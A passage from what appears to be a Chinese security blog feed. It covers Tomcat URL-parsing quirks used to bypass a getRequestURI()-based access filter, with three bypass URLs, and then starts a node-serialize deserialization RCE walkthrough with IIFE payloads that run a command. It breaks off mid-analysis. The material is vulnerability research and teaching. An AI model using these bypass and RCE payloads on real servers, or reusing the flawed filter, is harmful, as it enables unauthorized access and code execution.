title="HttpServletRequest中几个解析URL的函数"></a>HttpServletRequest中几个解析URL的函数</h3><p>在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：</p><ul><li>request.getRequestURL()：返回全路径；</li><li>request.getRequestURI()：返回除去Host（域名或IP）部分的路径；</li><li>request.getContextPath()：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li><li>request.getServletPath()：返回除去Host和工程名部分的路径；</li><li>request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</li></ul><p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p><table><thead><tr><th>函数</th><th>URL解码</th><th>解析结构</th></tr></thead><tbody><tr><td>getRequestURL()</td><td>no</td><td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getRequestURI()</td><td>no</td><td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getContextPath()</td><td>no</td><td><code>/app</code></td></tr><tr><td>getServletPath()</td><td>yes</td><td><code>/test?</code></td></tr><tr><td>getPathInfo()</td><td>yes</td><td><code>/a?+b</code></td></tr></tbody></table><h3 id="特殊字符的URL解析"><a href="#特殊字符的URL解析" class="headerlink" title="特殊字符的URL解析"></a>特殊字符的URL解析</h3><p>新建一个Java Web项目，index.jsp如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">out.println(<span class="string">"getRequestURL(): "</span> + request.getRequestURL() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getRequestURI(): "</span> + request.getRequestURI() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getContextPath(): "</span> + request.getContextPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getServletPath(): "</span> + request.getServletPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getPathInfo(): "</span> + request.getPathInfo() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="正常访问"><a href="#正常访问" class="headerlink" title="正常访问"></a>正常访问</h4><p>Tomcat运行之后，正常访问<code>http://localhost:8080/urltest/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/1.png" alt=""></p><h4 id="插入-访问"><a href="#插入-访问" class="headerlink" title="插入 ./ 访问"></a>插入 ./ 访问</h4><p>尝试插入多个<code>./</code>访问即<code>http://localhost:8080/urltest/./././index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/2.png" alt=""></p><p>可以看到，插入多个<code>./</code>也能正常访问。</p><p>接着尝试这种形式<code>http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp</code>，发现是返回404，未找到该资源访问：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/3.png" alt=""></p><h4 id="插入-访问-1"><a href="#插入-访问-1" class="headerlink" title="插入 ../ 访问"></a>插入 ../ 访问</h4><p>尝试插入<code>../</code>访问即<code>http://localhost:8080/urltest/../index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/4.png" alt=""></p><p>可以是返回的404，这是因为实际访问的是<code>http://localhost:8080/index.jsp</code>，这个目录文件当然不存在。</p><p>换种跨目录的形式就OK了<code>http://localhost:8080/urltest/noexist/../index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/5.png" alt=""></p><h4 id="插入-访问-2"><a href="#插入-访问-2" class="headerlink" title="插入 ;/ 访问"></a>插入 ;/ 访问</h4><p>尝试插入多个<code>;/</code>访问即<code>http://localhost:8080/urltest/;/;/;/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/6.png" alt=""></p><p>可以看到，插入多个<code>;</code>也能正常访问。</p><p>在<code>;</code>号后面加上字符串也是能正常访问的，如<code>http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/7.png" alt=""></p><h4 id="插入其他特殊字符访问"><a href="#插入其他特殊字符访问" class="headerlink" title="插入其他特殊字符访问"></a>插入其他特殊字符访问</h4><p>尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \ | : &apos; &quot; &lt; &gt; ?</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>由前面的尝试知道，Tomcat中的URL解析是支持嵌入<code>./</code>、<code>../</code>、<code>;xx/</code>等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。</p><h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。</p><h3 id="Tomcat对URL特殊字符的处理"><a href="#Tomcat对URL特殊字符的处理" class="headerlink" title="Tomcat对URL特殊字符的处理"></a>Tomcat对URL特殊字符的处理</h3><p>这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。</p><p>经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">service:452, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">process:1195, AbstractHttp11Processor (org.apache.coyote.http11)</span><br><span class="line">process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)</span><br><span class="line">run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/8.png" alt=""></p><p>跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/9.png" alt=""></p><p>这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在<code>;</code>号，找到的话才会进入下面的if代码逻辑：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/10.png" alt=""></p><p>如果找到了<code>;</code>号，在if代码逻辑中后面的循环体会将<code>;xxx/</code>中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问<code>http://localhost:8080/urltest/;mi1k7ea/index.jsp</code>再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是<code>;</code>，47是<code>/</code>）：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/11.png" alt=""></p><p>由此可知，parsePathParameters()函数是对<code>;xxx/</code>这种形式进行处理的。</p><p>接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。</p><p>先看到这段代码，ASCII码92表示<code>\</code>，当匹配到时将其替换为ASCII码为47的<code>/</code>；当匹配到ASCII码0即空字符时，直接返回false无法成功解析：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/12.png" alt=""></p><p>往下是这段循环，判断是否有连续的<code>/</code>，存在的话则循环删除掉多余的<code>/</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/13.png" alt=""></p><p>接着往下看，这段循环就是对<code>./</code>和<code>../</code>这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/14.png" alt=""></p><p>这里尝试下添加<code>/./</code>访问的处理，看到找到之后是直接将其去掉然后继续放行：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/15.png" alt=""></p><p>这里尝试下添加<code>/../</code>访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/16.png" alt=""></p><p>由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过<code>;xxx/</code>的URL请求内容进标准化处理，具体为将连续的多个<code>/</code>给删除掉只保留一个、将<code>/./</code>删除掉、将<code>/../</code>进行跨目录拼接处理，最后返回处理后的URL路径。</p><p><strong>结论</strong></p><p>Tomcat对<code>/;xxx/</code>以及<code>/./</code>的处理是包容的、对<code>/../</code>会进行跨目录拼接处理。</p><h3 id="getRequestURI-的处理"><a href="#getRequestURI-的处理" class="headerlink" title="getRequestURI()的处理"></a>getRequestURI()的处理</h3><p>我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。</p><p>这里是直接调用Request.requestURI()函数然后直接返回其字符串值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/19.png" alt=""></p><p>跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/20.png" alt=""></p><h3 id="getRequestURL-的处理"><a href="#getRequestURL-的处理" class="headerlink" title="getRequestURL()的处理"></a>getRequestURL()的处理</h3><p>在getRequestURL()函数中是调用了Request.getRequestURL()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/24.png" alt=""></p><p>跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/25.png" alt=""></p><h3 id="getServletPath-的处理"><a href="#getServletPath-的处理" class="headerlink" title="getServletPath()的处理"></a>getServletPath()的处理</h3><p>在getServletPath()函数中是调用了Request.getServletPath()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/21.png" alt=""></p><p>跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/22.png" alt=""></p><h3 id="getPathInfo-的处理"><a href="#getPathInfo-的处理" class="headerlink" title="getPathInfo()的处理"></a>getPathInfo()的处理</h3><p>和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/23.png" alt=""></p><h3 id="getContextPath-的处理"><a href="#getContextPath-的处理" class="headerlink" title="getContextPath()的处理"></a>getContextPath()的处理</h3><p>在getContextPath()函数中，调用了Request.getContextPath()函数：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/26.png" alt=""></p><p>跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/27.png" alt=""></p><p>往下的这段循环是处理uri变量值中如果存在多个连续的<code>/</code>则删除掉：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/28.png" alt=""></p><p>再往下，获取下一个<code>/</code>符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/29.png" alt=""></p><p>接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理<code>;</code>和<code>.</code>，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/30.png" alt=""></p><p>最后，直接返回按pos索引切分的uri变量值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/31.png" alt=""></p><h2 id="0x04-攻击利用"><a href="#0x04-攻击利用" class="headerlink" title="0x04 攻击利用"></a>0x04 攻击利用</h2><p>看个访问限制绕过的场景。</p><p>假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">username: mi1k7ea&lt;br&gt;</span><br><span class="line">password: <span class="number">123456</span>&lt;br&gt;</span><br><span class="line">address: china&lt;br&gt;</span><br><span class="line">phone: <span class="number">13666666666</span>&lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建一个filter包，其中新建一个testFilter类，实现Filter接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">"/urltest/info"</span>)) &#123;</span><br><span class="line">            httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。</p><p>编辑web.xml，添加testFilter设置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.testFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行之后，访问<code>http://localhost:8080/urltest/info/secret.jsp</code>，会显示无权限：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/17.png" alt=""></p><p>根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/urltest/./info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/18.png" alt=""></p><p>整个的过程大致如此，就是利用解析的差异性来绕过认证。</p><p>在前段时间爆出的Apache Shiro的CVE中，就是使用getRequestURI()函数导致的，这里可以看到人家的补丁是怎么打的，其实就是用getPathInfo()替换掉就OK了：<a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/security-of-getRequestURI.html" target="_blank" rel="noopener">getRequestURI()带来的安全问题</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Tomcat" scheme="https://www.mi1k7ea.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>node-serialize反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/node-serialize反序列化漏洞/</id>
    <published>2020-03-29T15:05:59.000Z</published>
    <updated>2020-03-29T16:02:10.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Node.js在node-serialize模块中存在反序列化漏洞，若unserialize()函数参数外部可控，则通过IIFE（Immediately Invoked Function Expression）可以实现RCE。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>需要安装node-serialize模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize</span><br></pre></td></tr></table></figure><h2 id="0x03-序列化"><a href="#0x03-序列化" class="headerlink" title="0x03 序列化"></a>0x03 序列化</h2><p>序列化代码如下，serialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p>变量y是一段payload，用于启动一个子线程来执行calc命令，这里输出序列化后的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;node serialize.js</span><br><span class="line">Serialized:</span><br><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-IIFE"><a href="#0x04-IIFE" class="headerlink" title="0x04 IIFE"></a>0x04 IIFE</h2><p>前面得到了序列化的字符串之后，就可以用unserialize()函数进行反序列化了。那么问题来了，怎么代码执行呢？这就用到了JavaScript的IIFE了。</p><p>IIFE（Immediately Invoked Function Expression）立即调用的函数表达式，即声明函数的同时立即调用该函数，目的是为了隔离作用域，防止污染全局命名空间。</p><p>IIFE一般有如下两种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code /* &#125;());</span><br><span class="line">(function()&#123; /* code /* &#125;)();</span><br></pre></td></tr></table></figure><p>有时，我们需要在定义函数之后，立即调用该函数。此时，你不能再函数的定义之后加上圆括号，这是因为会产生语法错误，错误原因是function这个关键字既可以当作语句，也可以当作表达式。为了避免其余，规定function关键字出现在行首时，解释为语句。因此，若是以function开头的代码则必须像前面一样的写法才能成功在定义时被当作表达式执行。</p><p>写下Demo试下，下面两种形式都能成功弹计算器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/1.png" alt=""></p><p>在前面序列化的代码serialize.js中，要想在序列化时直接执行该函数，可以将代码修改如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">poc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/2.png" alt=""></p><h2 id="0x05-反序列化触发RCE"><a href="#0x05-反序列化触发RCE" class="headerlink" title="0x05 反序列化触发RCE"></a>0x05 反序列化触发RCE</h2><p>前面序列化得到如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>在此基础上，为了在服务端进行反序列化操作的时候能触发RCE，我们直接在函数定义的后面追加<code>()</code>来构造即可（为啥能这么构造后面会说到）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure><p>反序列化代码如下，unserialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"function":"_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(\'child_process\').exec(\'calc\', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;()"&#125;'</span></span><br><span class="line"></span><br><span class="line">s.unserialize(payload);</span><br></pre></td></tr></table></figure><p>运行即可触发RCE弹计算器：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/3.png" alt=""></p><h2 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h2><p>我们看源码，位于NodeJS\node_modules\node-serialize\lib\serialize.js，其中反序列化相关的代码如下：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/4.png" alt=""></p><p>这里当解析到将要反序列化的内容中的键值为string类型时，判断是否包含FUNCFLAG变量值即<code>_$$ND_FUNC$$_</code>，在前面的代码中有定义，该值表明其中的内容是个函数：</p><p><img 